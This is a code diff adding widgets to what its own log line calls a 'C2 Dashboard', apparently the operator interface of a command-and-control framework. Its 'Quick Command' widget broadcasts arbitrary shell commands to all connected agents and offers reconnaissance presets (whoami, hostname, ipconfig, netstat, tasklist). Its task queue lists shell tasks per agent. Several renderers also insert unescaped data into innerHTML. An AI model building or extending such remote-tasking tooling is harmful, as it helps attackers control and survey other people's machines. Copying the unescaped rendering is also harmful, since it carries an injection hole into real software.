@@ -866,6 +866,10 @@ document.addEventListener('DOMContentLoaded', () => {
   initSmartInsights();
   initQuickActions();
   initAutoRefresh();
+  initSystemHealth();
+  initAlertCenter();
+  initQuickCommand();
+  initTaskQueue();
   
   // Welcome notification
   setTimeout(() => {
@@ -922,5 +926,336 @@ setInterval(() => {
 }, 60000);
 
 console.log('%c🚀 C2 Dashboard Loaded', 'color: #00d4ff; font-size: 16px; font-weight: bold;');
+
+// Initialize debug module
+C2_DEBUG.initPage('dashboard');
+
+/* ═══════════════════════════════════════════════════════════
+   SYSTEM HEALTH MONITOR
+   ═══════════════════════════════════════════════════════════ */
+
+function initSystemHealth() {
+  try {
+  const widget = document.createElement('div');
+  widget.className = 'panel';
+  widget.innerHTML = `
+    <div class="panel-header">
+      <span class="panel-title"><span class="panel-icon">🖥️</span> System Health</span>
+      <span class="badge success" id="sysHealthStatus">● Healthy</span>
+    </div>
+    <div class="panel-content">
+      <div class="sh-metrics">
+        <div class="sh-metric">
+          <div class="sh-metric-label">CPU</div>
+          <div class="progress-bar"><div class="progress-fill" id="cpuFill" style="width:0%"></div></div>
+          <div class="sh-metric-value" id="cpuVal">—</div>
+        </div>
+        <div class="sh-metric">
+          <div class="sh-metric-label">RAM</div>
+          <div class="progress-bar"><div class="progress-fill" id="ramFill" style="width:0%"></div></div>
+          <div class="sh-metric-value" id="ramVal">—</div>
+        </div>
+        <div class="sh-metric">
+          <div class="sh-metric-label">Disk</div>
+          <div class="progress-bar"><div class="progress-fill" id="diskFill" style="width:0%"></div></div>
+          <div class="sh-metric-value" id="diskVal">—</div>
+        </div>
+      </div>
+    </div>
+  `;
+  
+  const qaWidget = document.querySelector('.quick-actions-widget');
+  if (qaWidget) {
+    qaWidget.insertAdjacentElement('afterend', widget);
+  }
+  
+  const style = document.createElement('style');
+  style.textContent = `
+    .sh-metrics { display: flex; flex-direction: column; gap: 12px; }
+    .sh-metric { display: flex; align-items: center; gap: 12px; }
+    .sh-metric-label { width: 40px; font-size: 11px; font-weight: 600; color: var(--text-dim); }
+    .sh-metric-value { width: 50px; text-align: right; font-size: 11px; font-family: var(--font-mono); color: var(--text-dim); }
+    .progress-fill.warning { background: linear-gradient(90deg, var(--yellow), var(--orange)); }
+    .progress-fill.danger { background: linear-gradient(90deg, var(--orange), var(--red)); }
+  `;
+  document.head.appendChild(style);
+  
+  refreshSystemHealth();
+  setInterval(refreshSystemHealth, 5000);
+  C2_DEBUG.success('Dashboard', 'System Health widget initialized');
+  } catch (err) {
+    C2_DEBUG.error('Dashboard', 'Failed to init System Health', err);
+  }
+}
+
+function refreshSystemHealth() {
+  fetch('/api/server/health').then(r => r.json()).then(data => {
+    try {
+    const cpu = data.cpu || 0;
+    const ram = data.ram || 0;
+    const disk = data.disk || 0;
+    
+    document.getElementById('cpuFill').style.width = cpu + '%';
+    document.getElementById('cpuVal').textContent = cpu + '%';
+    document.getElementById('ramFill').style.width = ram + '%';
+    document.getElementById('ramVal').textContent = ram + '%';
+    document.getElementById('diskFill').style.width = disk + '%';
+    document.getElementById('diskVal').textContent = disk + '%';
+    
+    // Color coding
+    ['cpu', 'ram', 'disk'].forEach(m => {
+      const val = m === 'cpu' ? cpu : m === 'ram' ? ram : disk;
+      const fill = document.getElementById(m + 'Fill');
+      fill.classList.remove('warning', 'danger');
+      if (val > 80) fill.classList.add('danger');
+      else if (val > 60) fill.classList.add('warning');
+    });
+    
+    // Overall status
+    const status = document.getElementById('sysHealthStatus');
+    if (cpu > 80 || ram > 80 || disk > 80) {
+      status.className = 'badge danger';
+      status.textContent = '● Critical';
+    } else if (cpu > 60 || ram > 60 || disk > 60) {
+      status.className = 'badge warning';
+      status.textContent = '● Warning';
+    } else {
+      status.className = 'badge success';
+      status.textContent = '● Healthy';
+    }
+    } catch (err) {
+      C2_DEBUG.error('Dashboard', 'Error updating health display', err);
+    }
+  }).catch((err) => {
+    C2_DEBUG.warn('Dashboard', 'Health API unavailable', err);
+    ['cpu', 'ram', 'disk'].forEach(m => {
+      const el = document.getElementById(m + 'Val');
+      if (el) el.textContent = '—';
+    });
+  });
+}
+
+/* ═══════════════════════════════════════════════════════════
+   ALERT CENTER
+   ═══════════════════════════════════════════════════════════ */
+
+let alerts = [];
+
+function initAlertCenter() {
+  const widget = document.createElement('div');
+  widget.className = 'panel';
+  widget.innerHTML = `
+    <div class="panel-header">
+      <span class="panel-title"><span class="panel-icon">🔔</span> Alert Center</span>
+      <span class="badge danger" id="alertCount">0</span>
+    </div>
+    <div class="panel-content" id="alertList">
+      <div class="empty-state"><div class="empty-icon">🔔</div><div class="empty-text">No alerts</div></div>
+    </div>
+  `;
+  
+  const shWidget = document.querySelector('.panel');
+  if (shWidget) {
+    shWidget.insertAdjacentElement('afterend', widget);
+  }
+  
+  const style = document.createElement('style');
+  style.textContent = `
+    .ac-alert { display: flex; align-items: flex-start; gap: 10px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 6px; margin-bottom: 6px; border-left: 3px solid var(--accent); }
+    .ac-alert.error { border-left-color: var(--red); }
+    .ac-alert.warning { border-left-color: var(--yellow); }
+    .ac-alert.info { border-left-color: var(--accent); }
+    .ac-alert-icon { font-size: 16px; }
+    .ac-alert-content { flex: 1; }
+    .ac-alert-title { font-size: 12px; font-weight: 600; margin-bottom: 2px; }
+    .ac-alert-time { font-size: 10px; color: var(--text-dim); }
+    .ac-alert-dismiss { background: none; border: none; color: var(--text-dim); cursor: pointer; font-size: 14px; }
+  `;
+  document.head.appendChild(style);
+}
+
+function addAlert(type, title, message) {
+  const alert = { id: Date.now(), type, title, message, time: new Date() };
+  alerts.unshift(alert);
+  if (alerts.length > 10) alerts.pop();
+  renderAlerts();
+}
+
+function renderAlerts() {
+  const list = document.getElementById('alertList');
+  const count = document.getElementById('alertCount');
+  if (!list) return;
+  
+  count.textContent = alerts.length;
+  
+  if (alerts.length === 0) {
+    list.innerHTML = '<div class="empty-state"><div class="empty-icon">🔔</div><div class="empty-text">No alerts</div></div>';
+    return;
+  }
+  
+  list.innerHTML = alerts.map(a => `
+    <div class="ac-alert ${a.type}">
+      <span class="ac-alert-icon">${a.type === 'error' ? '🚨' : a.type === 'warning' ? '⚠️' : 'ℹ️'}</span>
+      <div class="ac-alert-content">
+        <div class="ac-alert-title">${a.title}</div>
+        <div class="ac-alert-time">${a.time.toLocaleTimeString()}</div>
+      </div>
+      <button class="ac-alert-dismiss" onclick="dismissAlert(${a.id})">×</button>
+    </div>
+  `).join('');
+}
+
+function dismissAlert(id) {
+  alerts = alerts.filter(a => a.id !== id);
+  renderAlerts();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   QUICK COMMAND INPUT
+   ═══════════════════════════════════════════════════════════ */
+
+function initQuickCommand() {
+  const widget = document.createElement('div');
+  widget.className = 'quick-command-widget';
+  widget.innerHTML = `
+    <div class="qc-header">⚡ Quick Command</div>
+    <div class="qc-input-wrapper">
+      <input type="text" id="quickCmdInput" placeholder="Enter command to broadcast to all agents..." class="qc-input">
+      <button class="qc-send" onclick="sendQuickCommand()">Send</button>
+    </div>
+    <div class="qc-presets">
+      <button onclick="setQuickCmd('whoami')">whoami</button>
+      <button onclick="setQuickCmd('hostname')">hostname</button>
+      <button onclick="setQuickCmd('ipconfig')">ipconfig</button>
+      <button onclick="setQuickCmd('netstat -an')">netstat</button>
+      <button onclick="setQuickCmd('tasklist')">tasklist</button>
+    </div>
+  `;
+  
+  const acWidget = document.querySelector('.alert-center-widget');
+  if (acWidget) {
+    acWidget.insertAdjacentElement('afterend', widget);
+  }
+  
+  const style = document.createElement('style');
+  style.textContent = `
+    .quick-command-widget { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; margin-top: 16px; overflow: hidden; }
+    .qc-header { padding: 12px 16px; background: rgba(0,0,0,0.2); border-bottom: 1px solid var(--border); font-weight: 600; font-size: 13px; }
+    .qc-input-wrapper { display: flex; gap: 8px; padding: 12px 16px; }
+    .qc-input { flex: 1; padding: 10px 14px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; color: var(--text); font-family: var(--font-mono); font-size: 12px; }
+    .qc-input:focus { outline: none; border-color: var(--accent); }
+    .qc-send { padding: 10px 20px; background: var(--accent); border: none; border-radius: 8px; color: #000; font-weight: 600; cursor: pointer; }
+    .qc-send:hover { filter: brightness(1.1); }
+    .qc-presets { display: flex; gap: 6px; padding: 0 16px 12px; flex-wrap: wrap; }
+    .qc-presets button { padding: 4px 10px; background: rgba(0,0,0,0.2); border: 1px solid var(--border); border-radius: 6px; color: var(--text-dim); font-size: 10px; font-family: var(--font-mono); cursor: pointer; }
+    .qc-presets button:hover { border-color: var(--accent); color: var(--accent); }
+  `;
+  document.head.appendChild(style);
+  
+  // Enter key support
+  document.getElementById('quickCmdInput')?.addEventListener('keydown', e => {
+    if (e.key === 'Enter') sendQuickCommand();
+  });
+}
+
+function setQuickCmd(cmd) {
+  document.getElementById('quickCmdInput').value = cmd;
+}
+
+function sendQuickCommand() {
+  const input = document.getElementById('quickCmdInput');
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  
+  fetch('/api/agents/broadcast', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({command: cmd})
+  })
+  .then(r => r.json())
+  .then(d => {
+    if (d.status === 'ok') {
+      showNotification(`✓ Command sent to ${d.count || 'all'} agents`, 'green');
+      input.value = '';
+    } else {
+      showNotification('✗ Failed to send command', 'red');
+    }
+  })
+  .catch(() => {
+    showNotification('✗ Error sending command', 'red');
+  });
+}
+
+/* ═══════════════════════════════════════════════════════════
+   TASK QUEUE MONITOR
+   ═══════════════════════════════════════════════════════════ */
+
+function initTaskQueue() {
+  const widget = document.createElement('div');
+  widget.className = 'task-queue-widget';
+  widget.innerHTML = `
+    <div class="tq-header">
+      <span>📋 Active Tasks</span>
+      <a href="/scheduler" style="color:var(--accent);font-size:10px">View all →</a>
+    </div>
+    <div class="tq-list" id="taskQueueList">
+      <div class="tq-empty">No active tasks</div>
+    </div>
+  `;
+  
+  const qcWidget = document.querySelector('.quick-command-widget');
+  if (qcWidget) {
+    qcWidget.insertAdjacentElement('afterend', widget);
+  }
+  
+  const style = document.createElement('style');
+  style.textContent = `
+    .task-queue-widget { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; margin-top: 16px; overflow: hidden; }
+    .tq-header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: rgba(0,0,0,0.2); border-bottom: 1px solid var(--border); font-weight: 600; font-size: 13px; }
+    .tq-list { max-height: 200px; overflow-y: auto; padding: 8px; }
+    .tq-empty { text-align: center; color: var(--text-dim); padding: 20px; font-size: 12px; }
+    .tq-task { display: flex; align-items: center; gap: 10px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 6px; margin-bottom: 6px; }
+    .tq-task-icon { width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 12px; }
+    .tq-task-icon.pending { background: rgba(255,208,0,0.15); color: var(--yellow); }
+    .tq-task-icon.running { background: rgba(0,212,255,0.15); color: var(--accent); }
+    .tq-task-content { flex: 1; }
+    .tq-task-type { font-size: 12px; font-weight: 600; }
+    .tq-task-agent { font-size: 10px; color: var(--text-dim); }
+    .tq-task-time { font-size: 10px; color: var(--text-dim); font-family: var(--font-mono); }
+  `;
+  document.head.appendChild(style);
+  
+  refreshTaskQueue();
+  setInterval(refreshTaskQueue, 5000);
+}
+
+function refreshTaskQueue() {
+  fetch('/api/tasks?status=pending,running&limit=5')
+    .then(r => r.json())
+    .then(tasks => {
+      const list = document.getElementById('taskQueueList');
+      if (!list) return;
+      
+      if (!tasks || tasks.length === 0) {
+        list.innerHTML = '<div class="tq-empty">No active tasks</div>';
+        return;
+      }
+      
+      list.innerHTML = tasks.map(t => `
+        <div class="tq-task">
+          <div class="tq-task-icon ${t.status}">${t.status === 'running' ? '▶' : '⏳'}</div>
+          <div class="tq-task-content">
+            <div class="tq-task-type">${t.task_type || 'shell'}</div>
+            <div class="tq-task-agent">${t.agent_id?.slice(0,8) || '—'}</div>
+          </div>
+          <div class="tq-task-time">${t.created_at?.slice(11,16) || '—'}</div>
+        </div>
+      `).join('');
+    })
+    .catch(() => {
+      const list = document.getElementById('taskQueueList');
+      if (list) list.innerHTML = '<div class="tq-empty">No active tasks</div>';
+    });
+}
 </script>
 {% endblock %}
